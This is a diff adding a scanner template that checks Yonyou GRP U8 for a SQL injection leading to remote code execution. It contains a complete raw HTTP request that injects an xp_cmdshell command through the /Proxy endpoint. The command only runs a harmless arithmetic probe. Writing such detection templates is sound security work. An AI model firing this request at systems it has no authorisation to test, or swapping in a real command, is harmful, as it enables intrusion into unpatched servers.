@@ -1,0 +1,28 @@
+id: poc-yaml-yonyou-grp-u8-sqli-to-rce
+info:
+  name: Yonyou Grp U8 SQL Injection to RCE
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: sql-injection,rce
+  description: |
+    Exploits a SQL injection vulnerability in Yonyou Grp U8 that can lead to remote code execution.
+variables:
+  r1: "{{rand_int(1000, 9999)}}"
+  r2: "{{rand_int(1000, 9999)}}"
+http:
+  - raw:
+      - |
+        POST /Proxy HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell 'set/A {{r1}}*{{r2}}'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(body, to_number(r1) * to_number(r2))
